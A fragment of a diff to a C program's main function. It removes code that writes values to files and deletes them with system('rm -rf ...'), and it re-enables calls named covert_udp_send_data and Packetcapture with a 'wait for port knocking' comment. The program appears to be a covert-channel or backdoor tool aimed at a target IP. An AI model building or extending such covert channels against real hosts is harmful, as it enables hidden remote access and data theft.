@@ -90,22 +90,6 @@ int main(int argc, char **argv){
                 exit(1);
         }
     }
-    FILE *fp;
-    if((fp = fopen("directory", "wb+")) == NULL) {
-        perror("fopen can't open file");
-        exit(1);
-    }
-    fprintf(fp, "%s", directory);
-    fclose(fp);
-    if((fp = fopen("file", "wb+")) == NULL) {
-        perror("fopen can't open file");
-        exit(1);
-    }
-    fprintf(fp, "%s", file);
-    fclose(fp);
-
-    system("rm -rf directory");
-    system("rm -rf file");
     /*inotify_struct *inotify_args = malloc(sizeof(*inotify_args));
     strncpy(inotify_args->file, file, BUFSIZ);
     strncpy(inotify_args->targetip, targetip, BUFSIZ);
@@ -113,7 +97,7 @@ int main(int argc, char **argv){
     strncpy(inotify_args->directory, directory, BUFSIZ);
     inotify_args->tcp = tcp;
     pthread_create(&inotify_thread, NULL, recv_watch_directory,inotify_args);*/
-    /*Filter = InitFilter(targetip,localip,false);
+    Filter = InitFilter(targetip,localip,false);
     PrintFilter(Filter);
     CreateFilter(Filter, pcapfilter);
     printf("Filter: %s\n",pcapfilter);
@@ -123,7 +107,7 @@ int main(int argc, char **argv){
         covert_udp_send_data(Filter.localip, Filter.targetip, UPORT, UPORT, data, 1);
     }
 	//wait for port knocking
-	Packetcapture(pcapfilter,Filter,tcp);*/
+	Packetcapture(pcapfilter,Filter,tcp);
 	//pthread_join(inotify_thread, NULL);
     return 0;
 }
